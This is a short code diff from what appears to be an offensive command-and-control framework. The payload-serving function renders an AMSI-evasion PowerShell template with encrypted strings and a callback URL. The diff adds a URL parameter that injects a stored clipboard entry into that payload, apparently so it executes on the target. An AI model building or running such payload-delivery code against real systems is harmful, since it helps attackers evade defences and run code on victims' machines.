@@ -297,6 +297,11 @@ def payload_0():
     ]
     encrypted_strings = [b64encode(encrypt(x.encode(), KEY)).decode() for x
                          in encrypted_strings]
+    try:
+        clipboard_id = int(request.args.get('e'))
+        exec_clipboard_entry = cb.entries[clipboard_id].content
+    except ValueError:
+        exec_clipboard_entry = ""
     context = {
         "modules": modules,
         "callback_url": callback_url,
@@ -304,6 +309,7 @@ def payload_0():
         "strings": encrypted_strings,
         "symbol_name": symbol_name,
         "stage2": 'r' if 'r' in request.args else '1',
+        "exec_clipboard_entry": exec_clipboard_entry,
     }
     result = render_template(
                     "amsi.ps1",
